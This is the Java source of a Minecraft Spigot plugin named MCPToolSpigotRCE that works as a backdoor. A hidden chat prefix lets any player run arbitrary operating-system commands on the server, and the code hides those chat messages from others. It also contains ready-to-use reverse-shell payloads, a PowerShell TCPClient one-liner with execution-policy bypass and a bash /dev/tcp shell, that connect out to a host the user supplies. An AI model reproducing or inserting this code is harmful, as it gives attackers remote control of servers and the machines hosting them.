package dev.wrrulos.mcptoolspigotrce;

import java.io.IOException;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;


public final class MCPToolSpigotRCE extends JavaPlugin implements Listener {
    String PLUGIN_PREFIX = "§7[§dSpigotRCE §cMCP§fTool§7] ";
    String COMMAND_PREFIX = "#mcprce";

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
    }

    /**
     * Listens for chat messages starting with the command prefix.
     *
     * @param event The event to listen for.
     */
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        if (!event.getMessage().startsWith(this.COMMAND_PREFIX)) {
            return;
        }

        event.setCancelled(true);
        String[] args = event.getMessage().split(" ");

        // Show help message if no arguments are provided
        if (args.length == 1) {
            event.getPlayer().sendMessage(this.PLUGIN_PREFIX + "§cInvalid usage. Use #rce help for more information.");
            return;
        }

        // Help command
        if (args[1].equalsIgnoreCase("help")) {
            event.getPlayer().sendMessage("§7Available commands:");
            event.getPlayer().sendMessage("§7- §d#rce help §7- Displays this message.");
            event.getPlayer().sendMessage("§7- §d#rce cmd <command> §7- Executes a command.");
            event.getPlayer().sendMessage("§7- §d#rce shell <ip:port> §7- Opens a reverse shell.");
            event.getPlayer().sendMessage("§7");
            event.getPlayer().sendMessage("§fDeveloped by §d@wrrulos");
            return;
        }

        // Cmd command
        if (args[1].equalsIgnoreCase("cmd")) {
            if (args.length < 3) {
                event.getPlayer().sendMessage(this.PLUGIN_PREFIX + "§cInvalid usage. Use #rce cmd <command>");
                return;
            }

            String command = event.getMessage().replace(this.COMMAND_PREFIX + " cmd ", "");
            executeCommand(command);
            event.getPlayer().sendMessage(this.PLUGIN_PREFIX + "§aCommand executed successfully.");
            return;
        }

        // Shell command
        if (args[1].equalsIgnoreCase("shell")) {
            if (args.length < 3) {
                event.getPlayer().sendMessage(this.PLUGIN_PREFIX + "§cInvalid usage. Use #rce shell <ip:port>");
                return;
            }

            String ip = args[2].split(":")[0];
            int port;

            try {
                port = Integer.parseInt(args[2].split(":")[1]);
            } catch (NumberFormatException e) {
                event.getPlayer().sendMessage(this.PLUGIN_PREFIX + "§cInvalid port.");
                return;
            }

            executeShell(ip, port);
            event.getPlayer().sendMessage(this.PLUGIN_PREFIX + "§aReverse shell opened successfully.");
            return;
        }

        event.getPlayer().sendMessage(this.PLUGIN_PREFIX + "§cInvalid usage. Use #rce help for more information.");
    }

    /**
     * Opens a reverse shell to the specified IP and port.
     *
     * @param ip   The IP address to connect to.
     * @param port The port to connect to.
     */
    private void executeShell(String ip, int port) {
        // Check the operating system
        String os = System.getProperty("os.name").toLowerCase();
        String command;

        if (os.contains("win")) {
            command = String.format(
                    "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();" +
                            "[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)" +
                            "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
                            "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
                            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);" +
                            "$stream.Flush()};$client.Close()", ip, port);
            command = String.format("powershell.exe -NoProfile -NoLogo -NonInteractive -ExecutionPolicy Bypass -Command \"%s\"", command);
        } else {
            command = String.format("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", ip, port);
        }

        // Execute the command
        executeCommand(command);
    }

    /**
     * Executes a command on the server.
     *
     * @param command The command to execute.
     */
    private void executeCommand(String command) {
        String os = System.getProperty("os.name").toLowerCase();
        String[] cmd;

        if (os.contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", command};
        } else {
            cmd = new String[]{"/bin/bash", "-c", command};
        }

        try {
            new ProcessBuilder(cmd).start();
        } catch (IOException ignored) {}
    }
}
